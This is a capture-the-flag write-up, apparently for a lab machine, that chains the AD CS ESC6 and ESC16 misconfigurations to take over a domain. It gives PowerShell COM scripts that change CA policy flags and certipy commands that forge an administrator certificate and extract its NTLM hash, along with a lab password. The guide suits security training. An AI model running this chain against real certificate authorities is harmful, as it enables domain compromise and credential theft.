## ESC6 + ESC16 privesc chain
 
### ESC6
 
This basically means an insecure configuration can be set globally on the CA, enabling the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag in the configuration, being able to provide an alternative name `(SAN)` and being able to set as the alternative name, the administrator's
 
First, we have to use the DCOM API from the winrm console to enable it, with the following commands
 
```powershell
# We create the CA management COM object
$certAdmin = New-Object -ComObject CertificateAuthority.Admin
 
# We define the configuration string (Machine\CAName)
$configString = "DC01.fries.htb\fries-DC01-CA"
 
# We define the path of the flags configuration node
$nodePath = "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"
 
# We get the current value of the flags 
try {
    $currentFlags = $certAdmin.GetConfigEntry($configString, $nodePath, "EditFlags")
    Write-Host "[*] Current flags: $currentFlags"
} catch {
    Write-Error "Error connecting to the CA via COM. Verify the name."
    exit
}
 
# We calculate the new value by adding the EDITF_ATTRIBUTESUBJECTALTNAME2 flag
$sanFlag = 0x00040000
$newFlags = $currentFlags -bor $sanFlag
 
if ($currentFlags -eq $newFlags) {
    Write-Host "[!] The SAN flag was already enabled."
} else {
		# We insert the new configuration
    try {
        $certAdmin.SetConfigEntry($configString, $nodePath, "EditFlags", $newFlags)
        Write-Host "[+] SUCCESS! The configuration has been modified via COM."
        Write-Host "[*] New flags: $newFlags"
    } catch {
        Write-Error "Error writing the configuration: $_"
    }
}
```

### ESC16
 
Now, what we have to do is disable the SID extension so we can quietly insert the administrator's without the CA complaining
 
In the certipy wiki, it says that this ESC6 must be exploited together with ESC9 or ESC16, so we'll do it with ESC16
 
[ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
 
We have to disable the security extension by adding the OID `1.3.6.1.4.1.311.25.2`, we'll do it again with the DCOM API
 
```
$admin = New-Object -ComObject CertificateAuthority.Admin
$config = "DC01.fries.htb\fries-DC01-CA"
$path = "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"
 
$currentList = $admin.GetConfigEntry($config, $path, "DisableExtensionList")
 
$newList = @($currentList) + "1.3.6.1.4.1.311.25.2"
 
$admin.SetConfigEntry($config, $path, "DisableExtensionList", $newList)
```
 
We restart the service again
 
Now, since we have a user who can enroll with one of the certificates, the user is `svc_infra`, and since we've disabled everything, we can set the UPN to `administrator@fries.htb` and putting the SID we saw in bloodhound
 
```
certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -dc-ip 10.129.29.182 -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
```

Now with this pfx using certipy we can extract the NTLM hash to connect via winrm as administrator and thus finish the machine
 
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.29.182
```
